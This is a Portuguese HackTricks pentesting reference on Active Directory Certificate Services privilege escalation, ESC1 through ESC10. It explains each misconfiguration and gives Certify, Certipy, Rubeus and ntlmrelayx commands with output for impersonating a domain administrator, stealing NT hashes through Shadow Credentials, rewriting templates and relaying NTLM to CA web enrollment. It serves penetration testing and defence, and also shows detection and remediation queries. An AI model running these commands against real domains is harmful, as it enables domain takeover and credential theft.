# AD CS Domain Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Este é um resumo das seções de técnicas de escalonamento dos posts:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modelos de Certificado Mal Configurados - ESC1

### Explicação

### Modelos de Certificado Mal Configurados - ESC1 Explicado

* **Os direitos de inscrição são concedidos a usuários com baixos privilégios pela CA Empresarial.**
* **A aprovação do gerente não é necessária.**
* **Nenhuma assinatura de pessoal autorizado é necessária.**
* **Os descritores de segurança nos modelos de certificado são excessivamente permissivos, permitindo que usuários com baixos privilégios obtenham direitos de inscrição.**
* **Os modelos de certificado são configurados para definir EKUs que facilitam a autenticação:**
* Identificadores de Uso de Chave Estendida (EKU) como Autenticação de Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticação de Cliente PKINIT (1.3.6.1.5.2.3.4), Logon de Cartão Inteligente (OID 1.3.6.1.4.1.311.20.2.2), Qualquer Propósito (OID 2.5.29.37.0), ou sem EKU (SubCA) estão incluídos.
* **A capacidade de os solicitantes incluírem um subjectAltName na Solicitação de Assinatura de Certificado (CSR) é permitida pelo modelo:**
* O Active Directory (AD) prioriza o subjectAltName (SAN) em um certificado para verificação de identidade, se presente. Isso significa que, ao especificar o SAN em um CSR, um certificado pode ser solicitado para se passar por qualquer usuário (por exemplo, um administrador de domínio). Se um SAN pode ser especificado pelo solicitante é indicado no objeto AD do modelo de certificado através da propriedade `mspki-certificate-name-flag`. Esta propriedade é uma máscara de bits, e a presença da flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite a especificação do SAN pelo solicitante.

{% hint style="danger" %}
A configuração descrita permite que usuários com baixos privilégios solicitem certificados com qualquer SAN de sua escolha, possibilitando a autenticação como qualquer principal de domínio através do Kerberos ou SChannel.
{% endhint %}

Esse recurso às vezes é habilitado para suportar a geração sob demanda de certificados HTTPS ou de host por produtos ou serviços de implantação, ou devido à falta de entendimento.

Observa-se que criar um certificado com esta opção aciona um aviso, o que não acontece quando um modelo de certificado existente (como o modelo `WebServer`, que tem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado) é duplicado e, em seguida, modificado para incluir um OID de autenticação.

### Abuso

Para **encontrar modelos de certificado vulneráveis** você pode executar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar dessa vulnerabilidade para se passar por um administrador**, pode-se executar:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Então você pode transformar o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticar usando Rubeus ou certipy** novamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser usados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

A enumeração de modelos de certificado dentro do esquema de configuração da floresta AD, especificamente aqueles que não necessitam de aprovação ou assinaturas, que possuem um EKU de Autenticação de Cliente ou Logon de Cartão Inteligente, e com a flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, pode ser realizada executando a seguinte consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelos de Certificado Mal Configurados - ESC2

### Explicação

O segundo cenário de abuso é uma variação do primeiro:

1. Direitos de inscrição são concedidos a usuários com baixos privilégios pela CA Empresarial.
2. A exigência de aprovação do gerente é desativada.
3. A necessidade de assinaturas autorizadas é omitida.
4. Um descritor de segurança excessivamente permissivo no modelo de certificado concede direitos de inscrição de certificado a usuários com baixos privilégios.
5. **O modelo de certificado é definido para incluir o EKU de Qualquer Propósito ou nenhum EKU.**

O **EKU de Qualquer Propósito** permite que um certificado seja obtido por um atacante para **qualquer propósito**, incluindo autenticação de cliente, autenticação de servidor, assinatura de código, etc. A mesma **técnica usada para ESC3** pode ser empregada para explorar este cenário.

Certificados com **nenhum EKU**, que atuam como certificados de CA subordinada, podem ser explorados para **qualquer propósito** e podem **também ser usados para assinar novos certificados**. Assim, um atacante poderia especificar EKUs ou campos arbitrários nos novos certificados utilizando um certificado de CA subordinada.

No entanto, novos certificados criados para **autenticação de domínio** não funcionarão se a CA subordinada não for confiável pelo objeto **`NTAuthCertificates`**, que é a configuração padrão. No entanto, um atacante ainda pode criar **novos certificados com qualquer EKU** e valores de certificado arbitrários. Estes poderiam ser potencialmente **abusados** para uma ampla gama de propósitos (por exemplo, assinatura de código, autenticação de servidor, etc.) e poderiam ter implicações significativas para outras aplicações na rede, como SAML, AD FS ou IPSec.

Para enumerar modelos que correspondem a este cenário dentro do esquema de configuração da Floresta AD, a seguinte consulta LDAP pode ser executada:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modelos de Agente de Inscrição Mal Configurados - ESC3

### Explicação

Este cenário é semelhante ao primeiro e ao segundo, mas **abusando** de uma **EKU** diferente (Agente de Solicitação de Certificado) e **2 modelos diferentes** (portanto, possui 2 conjuntos de requisitos),

A **EKU do Agente de Solicitação de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conhecida como **Agente de Inscrição** na documentação da Microsoft, permite que um principal **inscreva-se** para um **certificado** em **nome de outro usuário**.

O **“agente de inscrição”** se inscreve em tal **modelo** e usa o **certificado resultante para co-assinar um CSR em nome do outro usuário**. Em seguida, **envia** o **CSR co-assinado** para a CA, inscrevendo-se em um **modelo** que **permite “inscrever em nome de”**, e a CA responde com um **certificado pertencente ao “outro” usuário**.

**Requisitos 1:**

* Direitos de inscrição são concedidos a usuários de baixo privilégio pela CA Empresarial.
* A exigência de aprovação do gerente é omitida.
* Nenhuma exigência de assinaturas autorizadas.
* O descritor de segurança do modelo de certificado é excessivamente permissivo, concedendo direitos de inscrição a usuários de baixo privilégio.
* O modelo de certificado inclui a EKU do Agente de Solicitação de Certificado, permitindo a solicitação de outros modelos de certificado em nome de outros principais.

**Requisitos 2:**

* A CA Empresarial concede direitos de inscrição a usuários de baixo privilégio.
* A aprovação do gerente é contornada.
* A versão do esquema do modelo é 1 ou superior a 2, e especifica um Requisito de Emissão de Política de Aplicação que necessita da EKU do Agente de Solicitação de Certificado.
* Uma EKU definida no modelo de certificado permite autenticação de domínio.
* Restrições para agentes de inscrição não são aplicadas na CA.

### Abuso

Você pode usar [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar deste cenário:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Os **usuários** que têm permissão para **obter** um **certificado de agente de inscrição**, os modelos nos quais os **agentes** de inscrição estão autorizados a se inscrever e as **contas** em nome das quais o agente de inscrição pode agir podem ser restringidos por CAs empresariais. Isso é alcançado abrindo o `certsrc.msc` **snap-in**, **clicando com o botão direito na CA**, **clicando em Propriedades** e, em seguida, **navegando** até a guia “Agentes de Inscrição”.

No entanto, observa-se que a configuração **padrão** para CAs é “**Não restringir agentes de inscrição**.” Quando a restrição sobre agentes de inscrição é ativada pelos administradores, configurá-la para “Restringir agentes de inscrição”, a configuração padrão permanece extremamente permissiva. Ela permite que **Todos** tenham acesso para se inscrever em todos os modelos como qualquer um.

## Controle de Acesso a Modelos de Certificado Vulneráveis - ESC4

### **Explicação**

O **descritor de segurança** nos **modelos de certificado** define as **permissões** específicas que os **principais AD** possuem em relação ao modelo.

Se um **atacante** possuir as **permissões** necessárias para **alterar** um **modelo** e **instituir** quaisquer **configurações incorretas exploráveis** descritas em **seções anteriores**, a escalada de privilégios pode ser facilitada.

As permissões notáveis aplicáveis aos modelos de certificado incluem:

* **Owner:** Concede controle implícito sobre o objeto, permitindo a modificação de quaisquer atributos.
* **FullControl:** Habilita autoridade completa sobre o objeto, incluindo a capacidade de alterar quaisquer atributos.
* **WriteOwner:** Permite a alteração do proprietário do objeto para um principal sob o controle do atacante.
* **WriteDacl:** Permite o ajuste dos controles de acesso, potencialmente concedendo ao atacante FullControl.
* **WriteProperty:** Autoriza a edição de quaisquer propriedades do objeto.

### Abuso

Um exemplo de um privesc como o anterior:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 é quando um usuário tem privilégios de escrita sobre um modelo de certificado. Isso pode, por exemplo, ser abusado para sobrescrever a configuração do modelo de certificado para torná-lo vulnerável ao ESC1.

Como podemos ver no caminho acima, apenas `JOHNPC` possui esses privilégios, mas nosso usuário `JOHN` tem a nova borda `AddKeyCredentialLink` para `JOHNPC`. Como essa técnica está relacionada a certificados, implementei esse ataque também, que é conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o hash NT da vítima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** pode sobrescrever a configuração de um modelo de certificado com um único comando. Por **padrão**, Certipy irá **sobrescrever** a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o **`-save-old` parâmetro para salvar a configuração antiga**, o que será útil para **restaurar** a configuração após nosso ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controle de Acesso a Objetos PKI Vulneráveis - ESC5

### Explicação

A extensa rede de relacionamentos interconectados baseados em ACL, que inclui vários objetos além dos modelos de certificado e da autoridade certificadora, pode impactar a segurança de todo o sistema AD CS. Esses objetos, que podem afetar significativamente a segurança, incluem:

* O objeto de computador AD do servidor CA, que pode ser comprometido por meio de mecanismos como S4U2Self ou S4U2Proxy.
* O servidor RPC/DCOM do servidor CA.
* Qualquer objeto ou contêiner AD descendente dentro do caminho de contêiner específico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Este caminho inclui, mas não se limita a, contêineres e objetos como o contêiner de Modelos de Certificado, contêiner de Autoridades Certificadoras, o objeto NTAuthCertificates e o Contêiner de Serviços de Inscrição.

A segurança do sistema PKI pode ser comprometida se um atacante com privilégios baixos conseguir controlar qualquer um desses componentes críticos.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicação

O assunto discutido na [**postagem da CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) também aborda as implicações do **`EDITF_ATTRIBUTESUBJECTALTNAME2`** conforme descrito pela Microsoft. Esta configuração, quando ativada em uma Autoridade Certificadora (CA), permite a inclusão de **valores definidos pelo usuário** no **nome alternativo do sujeito** para **qualquer solicitação**, incluindo aquelas construídas a partir do Active Directory®. Consequentemente, essa disposição permite que um **intruso** se inscreva através de **qualquer modelo** configurado para **autenticação** de domínio—especificamente aqueles abertos à inscrição de usuários **não privilegiados**, como o modelo padrão de Usuário. Como resultado, um certificado pode ser obtido, permitindo que o intruso se autentique como um administrador de domínio ou **qualquer outra entidade ativa** dentro do domínio.

**Nota**: A abordagem para adicionar **nomes alternativos** em uma Solicitação de Assinatura de Certificado (CSR), através do argumento `-attrib "SAN:"` no `certreq.exe` (referido como “Pares de Nome e Valor”), apresenta um **contraste** em relação à estratégia de exploração de SANs no ESC1. Aqui, a distinção reside em **como as informações da conta são encapsuladas**—dentro de um atributo de certificado, em vez de uma extensão.

### Abuso

Para verificar se a configuração está ativada, as organizações podem utilizar o seguinte comando com `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operação emprega essencialmente **acesso remoto ao registro**, portanto, uma abordagem alternativa pode ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Ferramentas como [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) são capazes de detectar essa má configuração e explorá-la:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para alterar essas configurações, assumindo que se possui direitos **administrativos de domínio** ou equivalentes, o seguinte comando pode ser executado de qualquer estação de trabalho:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para desativar essa configuração em seu ambiente, a flag pode ser removida com:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Após as atualizações de segurança de maio de 2022, os **certificados** recém-emitidos conterão uma **extensão de segurança** que incorpora a **propriedade `objectSid` do solicitante**. Para o ESC1, esse SID é derivado do SAN especificado. No entanto, para o **ESC6**, o SID reflete o **`objectSid` do solicitante**, não o SAN.\
Para explorar o ESC6, é essencial que o sistema seja suscetível ao ESC10 (Mapeamentos de Certificado Fracos), que prioriza o **SAN sobre a nova extensão de segurança**.
{% endhint %}

## Controle de Acesso da Autoridade Certificadora Vulnerável - ESC7

### Ataque 1

#### Explicação

O controle de acesso para uma autoridade certificadora é mantido através de um conjunto de permissões que governam as ações da CA. Essas permissões podem ser visualizadas acessando `certsrv.msc`, clicando com o botão direito em uma CA, selecionando propriedades e, em seguida, navegando até a aba Segurança. Além disso, as permissões podem ser enumeradas usando o módulo PSPKI com comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Isso fornece insights sobre os direitos primários, nomeadamente **`ManageCA`** e **`ManageCertificates`**, correlacionando-se com os papéis de “administrador de CA” e “Gerente de Certificados”, respectivamente.

#### Abuso

Ter direitos de **`ManageCA`** em uma autoridade de certificação permite que o principal manipule configurações remotamente usando PSPKI. Isso inclui alternar o sinalizador **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir a especificação de SAN em qualquer modelo, um aspecto crítico da escalada de domínio.

A simplificação desse processo é alcançável através do uso do cmdlet **Enable-PolicyModuleFlag** do PSPKI, permitindo modificações sem interação direta com a GUI.

A posse de direitos de **`ManageCertificates`** facilita a aprovação de solicitações pendentes, contornando efetivamente a salvaguarda de "aprovação do gerente de certificados da CA".

Uma combinação dos módulos **Certify** e **PSPKI** pode ser utilizada para solicitar, aprovar e baixar um certificado:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicação

{% hint style="warning" %}
No **ataque anterior**, as permissões **`Manage CA`** foram usadas para **ativar** a flag **EDITF\_ATTRIBUTESUBJECTALTNAME2** para realizar o **ataque ESC6**, mas isso não terá efeito até que o serviço CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso **`Manage CA`**, o usuário também pode **reiniciar o serviço**. No entanto, isso **não significa que o usuário pode reiniciar o serviço remotamente**. Além disso, o **ESC6 pode não funcionar imediatamente** na maioria dos ambientes corrigidos devido às atualizações de segurança de maio de 2022.
{% endhint %}

Portanto, outro ataque é apresentado aqui.

Pré-requisitos:

* Apenas permissão **`ManageCA`**
* Permissão **`Manage Certificates`** (pode ser concedida a partir de **`ManageCA`**)
* O modelo de certificado **`SubCA`** deve estar **ativado** (pode ser ativado a partir de **`ManageCA`**)

A técnica se baseia no fato de que usuários com o direito de acesso **`Manage CA`** _e_ **`Manage Certificates`** podem **emitir solicitações de certificado falhadas**. O modelo de certificado **`SubCA`** é **vulnerável ao ESC1**, mas **apenas administradores** podem se inscrever no modelo. Assim, um **usuário** pode **solicitar** a inscrição no **`SubCA`** - que será **negada** - mas **depois emitida pelo gerente**.

#### Abuso

Você pode **conceder a si mesmo o direito de acesso `Manage Certificates`** adicionando seu usuário como um novo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
O **`SubCA`** template pode ser **habilitado na CA** com o parâmetro `-enable-template`. Por padrão, o template `SubCA` está habilitado.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se tivermos cumprido os pré-requisitos para este ataque, podemos começar **solicitando um certificado com base no modelo `SubCA`**.

**Esta solicitação será negada**, mas salvaremos a chave privada e anotaremos o ID da solicitação.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Com nossos **`Manage CA` e `Manage Certificates`**, podemos então **emitir a solicitação de certificado falhada** com o comando `ca` e o parâmetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E finalmente, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explicação

{% hint style="info" %}
Em ambientes onde **AD CS está instalado**, se um **ponto de inscrição web vulnerável** existir e pelo menos um **modelo de certificado está publicado** que permite **inscrição de computador de domínio e autenticação de cliente** (como o modelo padrão **`Machine`**), torna-se possível que **qualquer computador com o serviço spooler ativo seja comprometido por um atacante**!
{% endhint %}

Vários **métodos de inscrição baseados em HTTP** são suportados pelo AD CS, disponibilizados através de funções de servidor adicionais que os administradores podem instalar. Essas interfaces para inscrição de certificado baseada em HTTP são suscetíveis a **ataques de retransmissão NTLM**. Um atacante, a partir de uma **máquina comprometida, pode se passar por qualquer conta AD que autentique via NTLM de entrada**. Ao se passar pela conta da vítima, essas interfaces web podem ser acessadas por um atacante para **solicitar um certificado de autenticação de cliente usando os modelos de certificado `User` ou `Machine`**.

* A **interface de inscrição web** (uma aplicação ASP mais antiga disponível em `http://<caserver>/certsrv/`), por padrão, é apenas HTTP, o que não oferece proteção contra ataques de retransmissão NTLM. Além disso, permite explicitamente apenas autenticação NTLM através de seu cabeçalho HTTP de Autorização, tornando métodos de autenticação mais seguros, como Kerberos, inaplicáveis.
* O **Serviço de Inscrição de Certificado** (CES), **Política de Inscrição de Certificado** (CEP) Web Service, e **Serviço de Inscrição de Dispositivos de Rede** (NDES) por padrão suportam autenticação negotiate através de seu cabeçalho HTTP de Autorização. A autenticação negotiate **suporta ambos** Kerberos e **NTLM**, permitindo que um atacante **rebaixe para autenticação NTLM** durante ataques de retransmissão. Embora esses serviços web habilitem HTTPS por padrão, HTTPS sozinho **não protege contra ataques de retransmissão NTLM**. A proteção contra ataques de retransmissão NTLM para serviços HTTPS só é possível quando HTTPS é combinado com binding de canal. Infelizmente, o AD CS não ativa a Proteção Estendida para Autenticação no IIS, que é necessária para binding de canal.

Um **problema** comum com ataques de retransmissão NTLM é a **duração curta das sessões NTLM** e a incapacidade do atacante de interagir com serviços que **exigem assinatura NTLM**.

No entanto, essa limitação é superada ao explorar um ataque de retransmissão NTLM para adquirir um certificado para o usuário, uma vez que o período de validade do certificado dita a duração da sessão, e o certificado pode ser empregado com serviços que **exigem assinatura NTLM**. Para instruções sobre como utilizar um certificado roubado, consulte:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Outra limitação dos ataques de retransmissão NTLM é que **uma máquina controlada pelo atacante deve ser autenticada por uma conta vítima**. O atacante pode esperar ou tentar **forçar** essa autenticação:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera **pontos de extremidade HTTP AD CS habilitados**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

A propriedade `msPKI-Enrollment-Servers` é usada por Autoridades Certificadoras (CAs) empresariais para armazenar pontos de extremidade do Serviço de Inscrição de Certificados (CES). Esses pontos de extremidade podem ser analisados e listados utilizando a ferramenta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso com Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso com [Certipy](https://github.com/ly4k/Certipy)

A solicitação de um certificado é feita pelo Certipy por padrão com base no modelo `Machine` ou `User`, determinado por se o nome da conta sendo retransmitido termina em `$`. A especificação de um modelo alternativo pode ser alcançada através do uso do parâmetro `-template`.

Uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) pode então ser empregada para forçar a autenticação. Ao lidar com controladores de domínio, a especificação de `-template DomainController` é necessária.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicação

O novo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, referido como ESC9, impede a incorporação da **nova extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`** em um certificado. Esta flag se torna relevante quando `StrongCertificateBindingEnforcement` está configurado como `1` (a configuração padrão), o que contrasta com uma configuração de `2`. Sua relevância é aumentada em cenários onde um mapeamento de certificado mais fraco para Kerberos ou Schannel pode ser explorado (como no ESC10), dado que a ausência do ESC9 não alteraria os requisitos.

As condições sob as quais a configuração desta flag se torna significativa incluem:

* `StrongCertificateBindingEnforcement` não é ajustado para `2` (com o padrão sendo `1`), ou `CertificateMappingMethods` inclui a flag `UPN`.
* O certificado é marcado com a flag `CT_FLAG_NO_SECURITY_EXTENSION` dentro da configuração `msPKI-Enrollment-Flag`.
* Qualquer EKU de autenticação de cliente é especificado pelo certificado.
* Permissões `GenericWrite` estão disponíveis sobre qualquer conta para comprometer outra.

### Cenário de Abuso

Suponha que `John@corp.local` possua permissões `GenericWrite` sobre `Jane@corp.local`, com o objetivo de comprometer `Administrator@corp.local`. O modelo de certificado `ESC9`, no qual `Jane@corp.local` está autorizada a se inscrever, está configurado com a flag `CT_FLAG_NO_SECURITY_EXTENSION` em sua configuração `msPKI-Enrollment-Flag`.

Inicialmente, o hash de `Jane` é adquirido usando Credenciais Shadow, graças ao `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Subsequentemente, o `userPrincipalName` de `Jane` é modificado para `Administrator`, omitindo propositalmente a parte do domínio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Essa modificação não viola restrições, dado que `Administrator@corp.local` permanece distinto como o `userPrincipalName` de `Administrator`.

Após isso, o template de certificado `ESC9`, marcado como vulnerável, é solicitado como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
É observado que o `userPrincipalName` do certificado reflete `Administrator`, desprovido de qualquer “object SID”.

O `userPrincipalName` de `Jane` é então revertido para o seu original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Tentando autenticação com o certificado emitido agora resulta no hash NT de `Administrator@corp.local`. O comando deve incluir `-domain <domain>` devido à falta de especificação de domínio no certificado:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

Dois valores de chave de registro no controlador de domínio são referidos pelo ESC10:

* O valor padrão para `CertificateMappingMethods` sob `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` é `0x18` (`0x8 | 0x10`), anteriormente definido como `0x1F`.
* A configuração padrão para `StrongCertificateBindingEnforcement` sob `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` é `1`, anteriormente `0`.

**Case 1**

Quando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Case 2**

